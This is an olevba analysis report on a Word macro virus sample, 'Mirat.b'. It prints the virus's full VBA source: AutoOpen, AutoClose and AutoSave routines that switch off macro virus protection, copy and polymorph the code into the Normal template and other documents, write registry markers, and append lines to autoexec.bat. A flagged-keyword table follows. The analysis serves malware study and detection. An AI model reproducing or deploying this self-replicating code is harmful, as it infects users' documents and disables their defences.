olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat.b-602b9d65d3794b52b55283bcb48e052638354184
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat.b-602b9d65d3794b52b55283bcb48e052638354184 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fUY.bas 
in file: Virus.MSWord.Mirat.b-602b9d65d3794b52b55283bcb48e052638354184 - OLE stream: 'Macros/VBA/fUY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen() 'BD|! 'BD|! 'BD|!
'PolyMorphing Viruz by MI_pirat '{�u% '{�u% '{�u%
'CodeNAME: Kewl--NOT! 'Q‡~L 'Q‡~L 'Q‡~L
On Error Resume Next '“�&‘ '“�&‘ '“�&‘
StatusBar = "<< Kewl lives somewhere in HERE >>" 'K^|& 'K^|& 'K^|&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") <> "Kaka" Then 'gXCj 'gXCj 'gXCj
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") = "Kaka" 'm?A� 'm?A� 'm?A�
Options.VirusProtection = (2 Xor 2) '‚f–Ť '‚f–Ť '‚f–Ť
Dim nr, xxx, nume ';s•= ';s•= ';s•=
nume = Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) '`,—q '`,—q '`,—q
ActiveDocument.VBProject.VBComponents(2).Name = nume '!e,, '!e,, '!e,,
nr = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines 'B%C 'B%C 'B%C
Set myTemplate = NormalTemplate 'MD‘• 'MD‘• 'MD‘•
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'PA33 'PA33 'PA33
For i = 1 To nr 'mQQu 'mQQu 'mQQu
xxx = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1) 'Gk86 'Gk86 'Gk86
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) 'f)VŚ 'f)VŚ 'f)VŚ
strn = xxx + " '" + poly '?~MB '?~MB '?~MB
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn 'ŽkkS 'ŽkkS 'ŽkkS
Next i '+csŤ '+csŤ '+csŤ
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto '„"aŤ '„"aŤ '„"aŤ
ActiveDocument.Save 'Sq\] 'Sq\] 'Sq\]
ActiveDocument.Close 'WJP@ 'WJP@ 'WJP@
'Some publicity doesn't hurt anyone '&=•' '&=•' '&=•'
Open "C:\autoexec.bat" For Append As #1 'NKZ2 'NKZ2 'NKZ2
Print #1, "@echo off" 'X>ka 'X>ka 'X>ka
Print #1, "echo MI_pirat" '2�n\ '2�n\ '2�n\
Print #1, "echo Kewl LiVeS SoMeWhErE In YoUr SyStEm ---- ENDjoy" 'N,~W 'N,~W 'N,~W
Print #1, "echo." 'zg�" 'zg�" 'zg�"
Close #1 '9(,G '9(,G '9(,G
End If '/ `n '/ `n '/ `n
End Sub 'a�)7 'a�)7 'a�)7
Sub AutoClose() 'qVJ1 'qVJ1 'qVJ1
'Errr.. spead me 'tŹ_* 'tŹ_* 'tŹ_*
On Error Resume Next 'zPW[ 'zPW[ 'zPW[
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1 '8G+f '8G+f '8G+f
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !" '4Ź+U '4Ź+U '4Ź+U
Dim nume, myTemplate '@�z@ '@�z@ '@�z@
myTemplate = NormalTemplate 'p>*# 'p>*# 'p>*#
nume = NormalTemplate.VBProject.VBComponents(2).Name 'F~C< 'F~C< 'F~C<
For Each aVar In ActiveDocument.Variables 'Y>H% 'Y>H% 'Y>H%
    If aVar.Name = "Inf" Then num = aVar.Index 'Y8‡f 'Y8‡f 'Y8‡f
Next aVar 'zŹGa 'zŹGa 'zŹGa
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then ')lQ“ ')lQ“ ')lQ“
ActiveDocument.Variables.Add Name:="Inf" '-ŽjI '-ŽjI '-ŽjI
ActiveDocument.Variables("Inf").Value = 1 '1Y:— '1Y:— '1Y:—
Set myTemplate = ActiveDocument.AttachedTemplate '/#Ia '/#Ia '/#Ia
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'Ž`P… 'Ž`P… 'Ž`P…
ActiveDocument.Save '�pv— '�pv— '�pv—
End If 'H[Qs 'H[Qs 'H[Qs
End Sub '5Ra� '5Ra� '5Ra�
Sub AutoSave() '`S]; '`S]; '`S];
'Sure...Hehe infect it everytime 'jZqŠ 'jZqŠ 'jZqŠ
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1 'LDC2 'LDC2 'LDC2
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !" '_:fK '_:fK '_:fK
On Error Resume Next '‰Y6r '‰Y6r '‰Y6r
Dim nume, myTemplate 'yi}3 'yi}3 'yi}3
myTemplate = NormalTemplate '€8’' '€8’' '€8’'
nume = NormalTemplate.VBProject.VBComponents(2).Name ''MW ''MW ''MW
For Each aVar In ActiveDocument.Variables '.-4% '.-4% '.-4%
    If aVar.Name = "Inf" Then num = aVar.Index 'u_c: 'u_c: 'u_c:
Next aVar 'XyzO 'XyzO 'XyzO
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then 'Śy*l 'Śy*l 'Śy*l
ActiveDocument.Variables.Add Name:="Inf" 'u!SP 'u!SP 'u!SP
ActiveDocument.Variables("Inf").Value = 1 'A–€s 'A–€s 'A–€s
Set myTemplate = ActiveDocument.AttachedTemplate 'RxAJ 'RxAJ 'RxAJ
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'T‘.m 'T‘.m 'T‘.m
ActiveDocument.Save 'I,6) 'I,6) 'I,6)
End If 'S“a[ 'S“a[ 'S“a[
End Sub '”:MO '”:MO '”:MO
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
